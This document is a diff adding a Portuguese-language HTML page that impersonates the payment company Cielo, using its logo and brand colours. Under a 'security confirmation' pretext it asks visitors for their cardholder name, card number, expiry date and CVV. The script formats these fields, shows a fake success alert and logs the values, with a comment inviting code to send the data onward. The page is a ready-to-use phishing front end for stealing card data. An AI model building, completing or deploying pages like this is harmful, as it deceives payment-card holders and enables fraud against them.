@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação de Segurança Adicional</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            /* Fundo branco conforme solicitado */
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            /* Fundo branco para o container também */
+            background-color: #ffffff;
+            border-radius: 12px;
+            /* Sombra suave para destacar o container no fundo branco */
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+            padding: 40px 30px;
+            border: 1px solid #e0e0e0; /* Borda sutil para definir o container */
+        }
+
+        /* Estrutura da Logo Centralizada */
+        .logo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-img {
+            max-width: 150px; /* Ajuste o tamanho da logo conforme necessário */
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .logo-container h2 {
+            font-size: 20px;
+            /* Azul da marca Cielo para o título */
+            color: #0066cc;
+            margin-bottom: 5px;
+        }
+
+        .logo-container p {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+        }
+
+        /* Formulário e Campos */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            /* Azul da marca para os labels */
+            color: #0066cc;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid #ccced4;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+            background-color: #ffffff; /* Fundo branco para os inputs */
+            color: #333; /* Cor do texto do input */
+        }
+
+        .form-group input:focus {
+            /* Azul da marca para o foco do input */
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.15);
+        }
+
+        /* Linha dupla para Validade e CVV */
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        /* Botão de Ação */
+        .btn-submit {
+            width: 100%;
+            padding: 14px;
+            /* Azul da marca para o botão */
+            background-color: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-top: 10px;
+        }
+
+        .btn-submit:hover {
+            /* Tom de azul ligeiramente mais escuro no hover */
+            background-color: #0052a3;
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo-container">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkxr_IY7xxgZ_HvFHNJMscZEKemEfj7ncxHXYuJFHfoScvYVzCdBd99tAU&s=10" alt="Logo Cielo" class="logo-img">
+            <h2>Confirmação Adicional</h2>
+            <p>Por motivos de segurança, confirme os dados do seu cartão.</p>
+        </div>
+
+        <form id="securityForm" onsubmit="validarFormulario(event)">
+            
+            <div class="form-group">
+                <label for="nome">Nome impresso no cartão</label>
+                <input type="text" id="nome" placeholder="EX: JOÃO S SILVA" required autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label for="numero">Número do cartão</label>
+                <input type="text" id="numero" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="off">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="validade">Validade</label>
+                    <input type="text" id="validade" placeholder="MM/AA" maxlength="5" required autocomplete="off">
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="000" maxlength="4" required autocomplete="off">
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit">Confirmar e Continuar</button>
+
+        </form>
+    </div>
+
+    <script>
+        // --- MÁSCARAS DE INPUT (JavaScript) ---
+
+        const inputNumero = document.getElementById('numero');
+        const inputValidade = document.getElementById('validade');
+        const inputCvv = document.getElementById('cvv');
+        const inputNome = document.getElementById('nome');
+
+        // Força o nome a ficar sempre em letras maiúsculas
+        inputNome.addEventListener('input', (e) => {
+            e.target.value = e.target.value.toUpperCase();
+        });
+
+        // Máscara para o Número do Cartão (Agrupa de 4 em 4 dígitos)
+        inputNumero.addEventListener('input', (e) => {
+            let valor = e.target.value.replace(/\D/g, ''); // Remove tudo que não é número
+            valor = valor.replace(/(\d{4})(?=\d)/g, '$1 '); // Adiciona espaço a cada 4 dígitos
+            e.target.value = valor;
+        });
+
+        // Máscara para a Validade (Formato MM/AA)
+        inputValidade.addEventListener('input', (e) => {
+            let valor = e.target.value.replace(/\D/g, '');
+            if (valor.length > 2) {
+                valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
+            }
+            e.target.value = valor;
+        });
+
+        // Máscara para o CVV (Apenas números)
+        inputCvv.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // --- VALIDAÇÃO DE ENVIO ---
+        function validarFormulario(event) {
+            event.preventDefault(); // Impede o envio padrão da página
+
+            // Aqui você pode adicionar a lógica para enviar os dados ou avançar de etapa
+            alert('Dados validados com sucesso! Processando segurança adicional...');
+            
+            // Exemplo de como pegar os valores limpos:
+            console.log("Nome:", inputNome.value);
+            console.log("Número:", inputNumero.value.replace(/\s/g, ''));
+            console.log("Validade:", inputValidade.value);
+            console.log("CVV:", inputCvv.value);
+        }
+    </script>
+
+</body>
+</html>
